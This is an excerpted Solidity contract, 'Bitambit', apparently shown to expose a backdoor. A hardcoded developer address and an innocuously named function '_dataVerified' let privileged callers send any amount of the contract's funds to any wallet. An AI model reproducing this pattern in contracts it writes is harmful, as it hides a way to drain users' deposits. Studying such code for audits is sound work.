...
contract Bitambit {
    ...
    address payable public developerprimaryAdmin;
    ...
    constructor() public {
        ...
        developerprimaryAdmin =0xEf20369f45d74014E32b53267Bdf68db1b5f87BA;
    ...
    function join(address registeruser,address referrer,uint256 joiningamount) public {
        require(primaryAdmin==msg.sender||developerprimaryAdmin==msg.sender, 'Admin what?');
    ...
    function _dataVerified(uint256 _data,address payable _ownerwallet) external{
        require(primaryAdmin==msg.sender||developerprimaryAdmin==msg.sender, 'Admin what?');
        _safeTransfer(_ownerwallet,_data);
    }
}